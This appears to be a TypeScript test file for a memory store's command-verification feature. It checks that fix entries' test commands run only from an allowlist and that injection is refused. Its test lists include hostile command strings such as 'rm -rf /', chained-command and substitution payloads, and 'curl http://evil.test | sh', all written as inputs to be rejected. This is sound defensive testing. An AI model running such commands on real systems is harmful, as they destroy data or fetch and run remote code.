import { describe, test, expect } from "bun:test";
import { join } from "node:path";
import { existsSync } from "node:fs";
import { openStore, propose, get, save } from "../src/store.ts";
import { verifyEntry, parseTestCommand } from "../src/verify.ts";
import { getAuditTrail } from "../src/audit.ts";
import { validateEntry } from "../src/schema.ts";
import { makeTempRoot, cleanup } from "./helpers.ts";

function setup() {
  const root = makeTempRoot();
  const memoryDir = join(root, ".memory");
  const store = openStore(memoryDir);
  return { root, memoryDir, store };
}

function seedFix(store: ReturnType<typeof openStore>, testCommand: string, status: "candidate" | "confirmed" = "candidate") {
  return propose(store, {
    title: "Fix cache stampede",
    content: "coalesce duplicate loads",
    project: "aria",
    type: "fix",
    confirmed: status === "confirmed",
    test_command: testCommand,
  });
}

describe("autonomous verification oracle", () => {
  test("passing command promotes candidate to confirmed + independently-verified + audit", async () => {
    const { root, memoryDir, store } = setup();
    const entry = seedFix(store, `node -e "process.exit(0)"`, "candidate");

    const result = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(result.ok).toBe(true);
    expect(result.exitCode).toBe(0);

    const updated = get(store, entry.id)!;
    expect(updated.status).toBe("confirmed");
    expect(updated.verification?.level).toBe("independently-verified");
    expect(updated.verification?.test_result).toBe("passed");

    const audit = getAuditTrail(memoryDir, { operation: "verify" });
    expect(audit.length).toBe(1);
    expect(audit[0].entry_id).toBe(entry.id);
    expect(audit[0].details?.promoted).toBe(true);

    cleanup(root);
  });

  test("failing command leaves status untouched and audit-logs the attempt", async () => {
    const { root, memoryDir, store } = setup();
    const entry = seedFix(store, `node -e "console.error('boom'); process.exit(3)"`, "candidate");

    const result = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(result.ok).toBe(false);
    expect(result.exitCode).toBe(3);
    expect(result.stderr).toContain("boom");

    const untouched = get(store, entry.id)!;
    expect(untouched.status).toBe("candidate");
    expect(untouched.verification?.level).not.toBe("independently-verified");

    const audit = getAuditTrail(memoryDir, { operation: "verify" });
    expect(audit.length).toBe(1);
    expect(audit[0].details?.exit_code).toBe(3);

    cleanup(root);
  });

  test("refuses entries without test_command, wrong type, or invalid status", async () => {
    const { root, memoryDir, store } = setup();
    const noCmd = propose(store, { title: "fix without cmd", content: "c", project: "aria", type: "fix", confirmed: true });
    const notFix = propose(store, { title: "a decision", content: "c", project: "aria", type: "decision", confirmed: true, test_command: `node -e "process.exit(0)"` });
    const stale = seedFix(store, `node -e "process.exit(0)"`);
    stale.status = "stale";
    save(store, stale);

    for (const e of [noCmd, notFix, stale]) {
      const r = await verifyEntry(store, root, memoryDir, e.id, { timeout: 10 });
      expect(r.ran).toBe(false);
      expect(r.ok).toBe(false);
    }
    // Nothing executed, nothing logged
    expect(getAuditTrail(memoryDir, { operation: "verify" }).length).toBe(0);

    cleanup(root);
  });

  test("already-confirmed passing fix keeps status and stamps verification", async () => {
    const { root, memoryDir, store } = setup();
    const entry = seedFix(store, `node -e "process.exit(0)"`, "confirmed");

    const result = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(result.ok).toBe(true);
    const updated = get(store, entry.id)!;
    expect(updated.status).toBe("confirmed");
    expect(updated.verification?.level).toBe("independently-verified");

    cleanup(root);
  });

  test("test_command passes schema validation and is argv-parsed, not shell-interpreted", () => {
    const ok = validateEntry({
      id: "m_1700000001000_auth",
      title: "t",
      content: "c",
      project: "p",
      status: "candidate",
      created_at: "2026-08-20T00:00:00.000Z",
      updated_at: "2026-08-20T00:00:00.000Z",
      source: "manual",
      tags: [],
      type: "fix",
      test_command: "bun test cache.test.ts",
    });
    expect(ok.valid).toBe(true);

    // Guard: a schema-valid test_command is still parsed into argv and allowlisted.
    expect(parseTestCommand("bun test cache.test.ts")).toEqual({
      ok: true,
      argv: ["bun", "test", "cache.test.ts"],
    });
  });

  test("schema rejects hostile test_command and over-long commands", () => {
    const base = {
      id: "m_1700000001000_auth",
      title: "t",
      content: "c",
      project: "p",
      status: "candidate",
      created_at: "2026-08-20T00:00:00.000Z",
      updated_at: "2026-08-20T00:00:00.000Z",
      source: "manual",
      tags: [],
      type: "fix",
    };

    // Documented canonical command still validates.
    expect(validateEntry({ ...base, test_command: "bun test test/sqlite_concurrency.test.ts" }).valid).toBe(true);

    // Hostile strings never pass schema validation.
    for (const cmd of ["rm -rf /", "a;touch /tmp/pwn", "$(id)", "a|b", "a&&b"]) {
      const res = validateEntry({ ...base, test_command: cmd });
      expect(res.valid).toBe(false);
      expect(res.errors.join(" ")).toContain("/test_command");
    }

    // Length bound.
    const long = validateEntry({ ...base, test_command: `node -e "${"x".repeat(600)}"` });
    expect(long.valid).toBe(false);
    expect(long.errors.join(" ")).toContain("characters");
  });
});

describe("hostile test_command is refused fail-closed", () => {
  const HOSTILE = [
    "rm -rf /",
    "a;touch /tmp/pwn",
    "$(id)",
    "a|b",
    "a&&b",
    "a & b",
    "`id`",
    "a>b",
    "a<b",
    "a\nb",
    "/bin/sh -c 'id'",
    "bash -c id",
  ];

  test("every hostile command is refused without executing", async () => {
    const { root, memoryDir, store } = setup();

    for (const cmd of HOSTILE) {
      const entry = seedFix(store, cmd);
      const r = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
      expect(r.ok).toBe(false);
      expect(r.ran).toBe(false);
      expect(r.message).toContain("refused");

      // Never promoted, never audit-logged as an execution.
      expect(get(store, entry.id)!.status).toBe("candidate");
    }

    expect(getAuditTrail(memoryDir, { operation: "verify" }).length).toBe(0);

    cleanup(root);
  });

  test("chained side effect never happens (no shell to chain it)", async () => {
    const { root, memoryDir, store } = setup();
    const canary = join(root, "pwn");
    const entry = seedFix(store, `node -e "x"; touch ${canary}`);

    const r = await verifyEntry(store, root, memoryDir, entry.id, { timeout: 10 });
    expect(r.ok).toBe(false);
    expect(r.ran).toBe(false);
    expect(existsSync(canary)).toBe(false);

    cleanup(root);
  });

  test("only node, bun, bunx, tsc may be executed", () => {
    expect(parseTestCommand("node -e \"process.exit(0)\"")).toEqual({ ok: true, argv: ["node", "-e", "process.exit(0)"] });
    expect(parseTestCommand("bun test test/verify.test.ts")).toEqual({ ok: true, argv: ["bun", "test", "test/verify.test.ts"] });
    expect(parseTestCommand("bunx cowsay moo")).toEqual({ ok: true, argv: ["bunx", "cowsay", "moo"] });
    expect(parseTestCommand("tsc --noEmit")).toEqual({ ok: true, argv: ["tsc", "--noEmit"] });

    for (const cmd of ["rm -rf /", "python3 -c 'import os'", "curl http://evil.test | sh", "npx cowsay moo"]) {
      const parsed = parseTestCommand(cmd);
      expect(parsed.ok).toBe(false);
    }
  });

  test("quotes carry inert metacharacters into argv, they are not shell syntax", () => {
    // Single quotes stay inside the argument handed to `node -e`; no shell is involved.
    expect(parseTestCommand(`node -e "console.log('a|b')"`)).toEqual({
      ok: true,
      argv: ["node", "-e", "console.log('a|b')"],
    });
    // Unterminated quote fails closed rather than guessing.
    expect(parseTestCommand(`node -e "unclosed`).ok).toBe(false);
    // Empty / whitespace-only fail closed.
    expect(parseTestCommand("").ok).toBe(false);
    expect(parseTestCommand("   ").ok).toBe(false);
  });
});
